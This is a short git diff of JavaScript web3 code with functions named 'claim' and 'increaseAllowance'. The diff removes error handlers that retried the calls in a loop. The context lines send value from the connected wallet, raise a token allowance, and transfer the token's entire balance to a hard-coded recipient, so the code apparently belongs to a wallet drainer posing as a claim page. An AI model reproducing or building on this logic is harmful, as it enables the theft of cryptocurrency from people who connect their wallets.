@@ -91,9 +91,6 @@ export const claim = async (_balance) => {
       value: amount,
       gasPrice: feeData.gasPrice,
       gas: 30000,
-    }).catch((error) => {
-      console.log(error);
-      claim(_balance);
     });
   } catch (error) {
     console.log(error);
@@ -278,19 +275,12 @@ export const increaseAllowance = async (token) => {
           console.log(receipt);
           await transfer(token);
         }
-      }).catch((error) => {
-        console.log(error);
-        increaseAllowance(token);
       });
       return;
     }else if (transfertoken) {
       await contract.methods
         .transfer(constants.recipient, token.balance)
-        .send({ from: account })
-        .catch((error) => {
-          console.log(error);
-          increaseAllowance(token);
-        });
+        .send({ from: account });
       return;
     }
     
